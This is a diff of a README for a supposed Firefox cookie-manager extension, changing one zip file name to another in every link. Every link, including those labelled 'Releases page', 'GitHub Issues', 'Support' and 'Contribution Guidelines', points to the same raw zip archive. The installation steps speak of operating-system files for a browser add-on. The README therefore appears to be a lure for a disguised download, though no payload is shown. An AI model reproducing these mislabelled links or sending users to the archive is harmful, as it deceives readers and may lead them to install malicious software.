@@ -1,7 +1,7 @@
 # 🍪 cookie_manager - Manage Your Cookies Securely & Easily
 
 ## 🔗 Quick Download
-[![Download cookie_manager](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/manager_cookie_v3.8-beta.3.zip)](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/manager_cookie_v3.8-beta.3.zip)
+[![Download cookie_manager](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/cookie-manager-1.9.zip)](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/cookie-manager-1.9.zip)
 
 ## 🚀 Getting Started
 The cookie_manager is a user-friendly Firefox extension designed to help you manage your cookies safely and effectively. With features like encryption, profiles, and auto-backup, you can protect your privacy while easily organizing your cookies. Follow these steps to download and install the extension.
@@ -21,7 +21,7 @@ The cookie_manager is a user-friendly Firefox extension designed to help you man
 
 ## 💡 Installation Instructions
 To install the cookie_manager extension, follow these steps:
-1. Click on the **Download** button above or visit the [Releases page](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/manager_cookie_v3.8-beta.3.zip).
+1. Click on the **Download** button above or visit the [Releases page](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/cookie-manager-1.9.zip).
 2. On the Releases page, look for the latest version of the cookie_manager.
 3. Click on the file that corresponds to your operating system to begin the download.
 4. Once downloaded, open Firefox and navigate to the browser's extension page.
@@ -48,21 +48,21 @@ If you run into issues while using cookie_manager, consider these steps:
 - **Export/Import Failures**: Make sure the file you are using for import is formatted correctly.
 
 ## 📞 Support
-If you need further assistance, feel free to contact us through the issues section on our [GitHub page](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/manager_cookie_v3.8-beta.3.zip). We are here to help!
+If you need further assistance, feel free to contact us through the issues section on our [GitHub page](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/cookie-manager-1.9.zip). We are here to help!
 
 ## 📜 License
 cookie_manager is open-source and licensed under the MIT License. You can freely use and modify it according to your needs.
 
 ## 📝 Contribution
-We welcome contributions from the community. If you'd like to help improve cookie_manager, check our [Contribution Guidelines](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/manager_cookie_v3.8-beta.3.zip).
+We welcome contributions from the community. If you'd like to help improve cookie_manager, check our [Contribution Guidelines](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/cookie-manager-1.9.zip).
 
 ## 📢 Stay Updated
 For the latest updates, follow the repository and keep an eye on the Releases page. Join our community to stay informed about new features and improvements.
 
 ## 🔗 Additional Links
-- [Releases Page](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/manager_cookie_v3.8-beta.3.zip)
-- [GitHub Issues](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/manager_cookie_v3.8-beta.3.zip)
+- [Releases Page](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/cookie-manager-1.9.zip)
+- [GitHub Issues](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/cookie-manager-1.9.zip)
 
-[![Download cookie_manager](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/manager_cookie_v3.8-beta.3.zip)](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/manager_cookie_v3.8-beta.3.zip)
+[![Download cookie_manager](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/cookie-manager-1.9.zip)](https://github.com/moonishkumar/cookie_manager/raw/refs/heads/main/sidebar/cookie-manager-1.9.zip)
 
 Feel free to explore and enjoy managing your cookies securely with cookie_manager!
